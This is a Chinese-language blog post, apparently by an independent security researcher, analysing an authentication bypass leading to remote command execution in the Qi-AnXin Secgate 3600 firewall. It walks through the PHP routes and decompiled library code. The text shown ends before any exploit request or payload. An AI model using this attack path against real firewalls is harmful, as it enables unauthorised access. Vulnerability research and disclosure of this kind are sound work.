@@ -1,0 +1,975 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Zhiyuan">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/03/28/secgate-3600-rce/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="奇安信网神Secgate3600防火墙认证绕过+RCE">
+<meta property="og:url" content="http://example.com/2025/03/28/Secgate-3600-RCE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-03-28T06:28:52.000Z">
+<meta property="article:modified_time" content="2025-05-17T06:39:47.021Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Vulnerability">
+<meta property="article:tag" content="Network-Security-Device">
+<meta property="article:tag" content="奇安信">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/log2.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/log2.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/log2.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            奇安信网神Secgate3600防火墙认证绕过+RCE | Zhi0Yuan Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/drak.png"},"title":"兴趣是坚持和耐心的源泉","subtitle":{"text":["Zhi0Yuan","独立安全研究员","Never Fade Away"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Zhi0Yuan","instagram":null,"zhihu":null,"twitter":"https://x.com/Zeroved0x5A","email":"czhi540@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/images/log.jpg" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Zhi0Yuan Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">奇安信网神Secgate3600防火墙认证绕过+RCE</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/log.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Zhiyuan</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-03-28 14:28:52</span>
+        <span class="mobile">2025-03-28 14:28:52</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-05-17 14:39:47</span>
+            <span class="mobile">2025-05-17 14:39:47</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/My-Vulnerability/">My Vulnerability</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Vulnerability/">Vulnerability</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Network-Security-Device/">Network-Security-Device</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%A5%87%E5%AE%89%E4%BF%A1/">奇安信</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>奇安信网神Secgate3600防火墙认证绕过+RCE</p>
+</blockquote>
+<blockquote>
+<p>由于镜像从咸鱼获取，这个镜像和固件的可靠性不确定，所以我们并不能确定该漏洞是属于厂商问题还是被其他人植入的后门！！！！！！！！！(新版本已修复)</p>
+</blockquote>
+<h2 id="version"><a href="#version" class="headerlink" title="version"></a>version</h2><blockquote>
+<p>测试的版本为hw6.1.13.122100</p>
+</blockquote>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote>
+<p>未授权的用户可以通过&#x2F;auth接口免密认证,并使用后台的RCE达到,未授权RCE效果。</p>
+</blockquote>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><h3 id="免密登录"><a href="#免密登录" class="headerlink" title="免密登录"></a>免密登录</h3><p>我们先来看web路由规则</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;URL_ROUTE_RULES&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span> =&gt; <span class="string">&#x27;Home/Api/index&#x27;</span>,<span class="comment">//检查了toke</span></span><br><span class="line">    <span class="string">&#x27;config&#x27;</span> =&gt; <span class="string">&#x27;Home/Config/index&#x27;</span>,<span class="comment">//检查了toke</span></span><br><span class="line">    <span class="string">&#x27;decrypt_config&#x27;</span> =&gt; <span class="string">&#x27;Home/Config/index&#x27;</span>,<span class="comment">//检查了token</span></span><br><span class="line">    <span class="string">&#x27;verify&#x27;</span> =&gt; <span class="string">&#x27;Home/Login/verify&#x27;</span>,<span class="comment">//生成验证码</span></span><br><span class="line">    <span class="string">&#x27;login_submit&#x27;</span> =&gt; <span class="string">&#x27;Home/Login/login_submit&#x27;</span>,<span class="comment">//登录，一样调用的User-&gt;login</span></span><br><span class="line">    <span class="string">&#x27;login&#x27;</span> =&gt; <span class="string">&#x27;Home/Login/index&#x27;</span>,<span class="comment">//语言设置，浏览器版本检查。</span></span><br><span class="line">    <span class="string">&#x27;login/:lang&#x27;</span> =&gt; <span class="string">&#x27;Home/Login/index&#x27;</span>,<span class="comment">//语言设置没有什么参数可控</span></span><br><span class="line">    <span class="string">&#x27;modify&#x27;</span> =&gt; <span class="string">&#x27;Home/Login/modify&#x27;</span>,<span class="comment">//更改密码,需要老密码和新密码,过滤的挺好</span></span><br><span class="line">    <span class="string">&#x27;out&#x27;</span> =&gt; <span class="string">&#x27;Home/Login/out&#x27;</span>,<span class="comment">//由于调用send_mgd函数一样会检查是否存在token</span></span><br><span class="line">    <span class="string">&#x27;upload&#x27;</span> =&gt; <span class="string">&#x27;Home/Upload/index&#x27;</span>,<span class="comment">//上传，检查了是否为POST，检查了token</span></span><br><span class="line">    <span class="string">&#x27;queryUploadStatus&#x27;</span> =&gt; <span class="string">&#x27;Home/Upload/queryUploadStatus&#x27;</span>,<span class="comment">//貌似从session中获取config_command，暂时不清楚作用</span></span><br><span class="line">    <span class="string">&#x27;getDownLoad/:getDownLoad&#x27;</span> =&gt; <span class="string">&#x27;Home/Upload/download&#x27;</span>, <span class="comment">//检查了目录，检查是否有文件，过滤了目录穿越，检查了token</span></span><br><span class="line">    <span class="string">&#x27;heart&#x27;</span> =&gt; <span class="string">&#x27;Home/Login/heart&#x27;</span>,<span class="comment">//检查了token</span></span><br><span class="line">    <span class="string">&#x27;connect&#x27;</span> =&gt; <span class="string">&#x27;Home/Login/connect&#x27;</span>,<span class="comment">//检查设备是否已经准备好了</span></span><br><span class="line">    <span class="string">&#x27;WebChannel&#x27;</span> =&gt; <span class="string">&#x27;Home/Smac/channel&#x27;</span>,<span class="comment">//和下面一个调用的一样的函数</span></span><br><span class="line">    <span class="string">&#x27;auth/:token&#x27;</span>=&gt;<span class="string">&#x27;Home/Csmp/login&#x27;</span>,<span class="comment">//存在过滤</span></span><br><span class="line">    <span class="string">&#x27;auth&#x27;</span>=&gt;<span class="string">&#x27;Home/Csmp/CsmpConfig&#x27;</span> <span class="comment">//这里有一个注入但是过滤的非常严格</span></span><br><span class="line">),</span><br></pre></td></tr></table></figure></div>
+
+<p>免密登录在<code>Home/Csmp/login</code> and <code>Home/Csmp/CsmpConfig</code>对应的php文件为<code>secgate/webui/Application/Home/Controller/CsmpController.class.php</code> 对应的函数分别为<code>CsmpConfig</code>和<code>login</code>,先来看Csmpconfig函数。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/Secgate_3600_RCE/CsmpConfigFunction.jpg"
+                      alt="img"
+                ></p>
+<p>可以看到在接收到一系列的参数后拼接并成为了<code>$config</code>变量调并用了php_call_admin函数,可以看到我在后面的注释,确实过滤的挺好的反正我拿这个过滤没什么办法,我们继续规进php_call_admin函数,这个函数在<code>libsg_sc.so</code>库中。</p>
+<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">iVar2 = <span class="built_in">sso_input_is_valid</span>(in_buf);<span class="comment">//就是这里存在对参数的检查和过滤</span></span><br><span class="line"><span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">  puVar6 = (undefined8 *)<span class="built_in">malloc</span>(<span class="number">0x14</span>);</span><br><span class="line">  <span class="keyword">if</span> (puVar6 != (undefined8 *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    *puVar6 = <span class="number">0x61645f7475706e69</span>;</span><br><span class="line">    puVar6[<span class="number">1</span>] = <span class="number">0x6c61766e695f6174</span>;</span><br><span class="line">    *(undefined2 *)(puVar6 + <span class="number">2</span>) = <span class="number">0x6469</span>;</span><br><span class="line">    *(undefined *)((<span class="type">long</span>)puVar6 + <span class="number">0x12</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LAB_0013c4eb;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  puVar6 = (undefined8 *)cmd_lms_sso_check_sign;</span><br><span class="line">  <span class="keyword">for</span> (lVar7 = <span class="number">0x100</span>; lVar7 != <span class="number">0</span>; lVar7 = lVar7 + <span class="number">-1</span>) &#123;</span><br><span class="line">    *puVar6 = <span class="number">0</span>;</span><br><span class="line">    puVar6 = puVar6 + (ulong)bVar24 * <span class="number">-2</span> + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">snprintf</span>(cmd_lms_sso_check_sign,<span class="number">0x7ff</span>,<span class="string">&quot;echo in_buf[%s,%s] &gt; /tmp/lms_sso_test&quot;</span>,</span><br><span class="line">           <span class="string">&quot;php_call_admin&quot;</span>,in_buf);</span><br><span class="line">  <span class="built_in">system</span>(cmd_lms_sso_check_sign);</span><br><span class="line">  <span class="built_in">sg_admin_auth_user_ex_csmp_check_sign_get_token</span>(in_buf,&amp;csmp_result);<span class="comment">//核心函数</span></span><br><span class="line">  puVar6 = (undefined8 *)cmd_lms_sso_check_sign;</span><br><span class="line">  <span class="keyword">for</span> (lVar7 = <span class="number">0x100</span>; lVar7 != <span class="number">0</span>; lVar7 = lVar7 + <span class="number">-1</span>) &#123;</span><br><span class="line">    *puVar6 = <span class="number">0</span>;</span><br><span class="line">    puVar6 = puVar6 + (ulong)bVar24 * <span class="number">-2</span> + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">snprintf</span>(cmd_lms_sso_check_sign,<span class="number">0x7ff</span>,<span class="string">&quot;echo result[%s,%d,%s] &gt;&gt; /tmp/lms_sso_test&quot;</span>,</span><br><span class="line">           <span class="string">&quot;php_call_admin&quot;</span>,(ulong)(uint)csmp_result.result,csmp_result.data);</span><br><span class="line">  <span class="built_in">system</span>(cmd_lms_sso_check_sign);</span><br></pre></td></tr></table></figure></div>
+<p>对危险函数敏感的师傅一眼就那看到大量的system函数,没错这些执行命令非常诱人但是<code>sso_input_is_valid</code>函数的出现让我无可奈何,进入转发函数<code>sg_admin_auth_user_ex_csmp_check_sign_get_token</code>看看转发到哪里。</p>
+<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>((<span class="type">char</span> *)puVar3,in_buf,<span class="number">0x800</span>);</span><br><span class="line">puVar12 = (undefined8 *)cmd_lms_sso_check_sign;</span><br><span class="line"><span class="keyword">for</span> (lVar6 = <span class="number">0x100</span>; lVar6 != <span class="number">0</span>; lVar6 = lVar6 + <span class="number">-1</span>) &#123;</span><br><span class="line">  *puVar12 = <span class="number">0</span>;</span><br><span class="line">  puVar12 = puVar12 + (ulong)bVar17 * <span class="number">-2</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">snprintf</span>(cmd_lms_sso_check_sign,<span class="number">0x7ff</span>,<span class="string">&quot;echo in_buf[%s,%s] &gt;&gt; /tmp/lms_sso_test&quot;</span>,</span><br><span class="line">         <span class="string">&quot;sg_admin_auth_user_ex_csmp_check_sign_get_token&quot;</span>,puVar3);</span><br><span class="line"><span class="built_in">system</span>(cmd_lms_sso_check_sign);</span><br><span class="line">rcv_len = <span class="number">0</span>;</span><br><span class="line">local_1050 = (uint *)<span class="number">0x0</span>;</span><br><span class="line"><span class="keyword">if</span> (result != (admin_csmp_check_sign_get_token_res *)<span class="number">0x0</span>) &#123;</span><br><span class="line">  uVar2 = <span class="built_in">sg_ipc_send_and_recv</span>(<span class="number">0</span>,<span class="number">0x14</span>,<span class="number">3</span>,puVar3,<span class="number">0x800</span>,&amp;local_1050,&amp;rcv_len);</span><br><span class="line">  puVar12 = (undefined8 *)cmd_lms_sso_check_sign_1;</span><br><span class="line">  <span class="keyword">for</span> (lVar6 = <span class="number">0x100</span>; lVar6 != <span class="number">0</span>; lVar6 = lVar6 + <span class="number">-1</span>) &#123;</span><br><span class="line">    *puVar12 = <span class="number">0</span>;</span><br><span class="line">    puVar12 = puVar12 + (ulong)bVar17 * <span class="number">-2</span> + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">snprintf</span>(cmd_lms_sso_check_sign_1,<span class="number">0x7ff</span>,<span class="string">&quot;echo send[%s,%s,%d] &gt;&gt; /tmp/lms_sso_test&quot;</span>,</span><br><span class="line">           <span class="string">&quot;send_auth_msg_to_admind_check_sign_get_token&quot;</span>,puVar3);</span><br><span class="line">  <span class="built_in">system</span>(cmd_lms_sso_check_sign_1);</span><br></pre></td></tr></table></figure></div>
+<p>这里先说一下这个转发,每一个程序会使用<code>sg_ipc_init</code>函数初始化,并由<code>sg_ipc_register</code>函数注册对应的函数<code>sg_ipc_send_and_recv(0,0x14,3,puVar3,0x800,&amp;local_1050,&amp;rcv_len);</code>就是使用<code>sg_ipc_ini(0x14)</code>和<code>sg_ipc_register(3,function)</code>的目标程序,我们全局搜索调用<code>sg_ipc_ini</code>函数的程序最终<code>admind</code>符合我们的要求。</p>
+<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">undefined8 <span class="title">FUN_00403f00</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">long</span> lVar1;</span><br><span class="line">  undefined8 uVar2;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  </span><br><span class="line">  lVar1 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  _DAT_0061dd90 = <span class="built_in">event_init</span>();</span><br><span class="line">  <span class="keyword">if</span> (_DAT_0061dd90 == <span class="number">0</span>) &#123;</span><br><span class="line">    uVar2 = <span class="number">0xffffffff</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">sg_ipc_init</span>(<span class="number">0x14</span>);</span><br><span class="line">    uVar2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (lVar1 == *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> uVar2;</span><br><span class="line">  &#125;</span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">undefined8 <span class="title">FUN_00402d10</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">long</span> lVar1;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  </span><br><span class="line">  lVar1 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">sg_dbg_init_ex</span>(<span class="number">2</span>);</span><br><span class="line">  __cp_log_init(<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">mgd_shm_cfg_init_ex</span>();</span><br><span class="line">  <span class="built_in">FUN_00403e20</span>();</span><br><span class="line">  <span class="built_in">daemon</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">set_oom_adj</span>(<span class="number">0xfffffff0</span>);</span><br><span class="line">  <span class="built_in">FUN_00403f00</span>();</span><br><span class="line">  <span class="built_in">sg_ipc_register</span>(<span class="number">3</span>,FUN_00410fb0);</span><br><span class="line">  <span class="built_in">sg_ipc_register</span>(<span class="number">0</span>,FUN_00411120);</span><br><span class="line">  <span class="built_in">sg_ipc_register</span>(<span class="number">1</span>,FUN_<span class="number">004112e0</span>);</span><br><span class="line">  <span class="built_in">sg_ipc_register</span>(<span class="number">2</span>,FUN_00415260);</span><br><span class="line">  <span class="built_in">sg_ipc_register_system</span>(<span class="number">4</span>,FUN_00411fc0);</span><br><span class="line">  <span class="built_in">vsys_notify_init</span>();</span><br><span class="line">  <span class="built_in">sg_attack_class_info_init</span>(<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">sg_threat_type_info_init</span>(<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">FUN_00403f60</span>();</span><br><span class="line">  <span class="keyword">if</span> (lVar1 == *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>进入<code>FUN_00410fb0</code>函数</p>
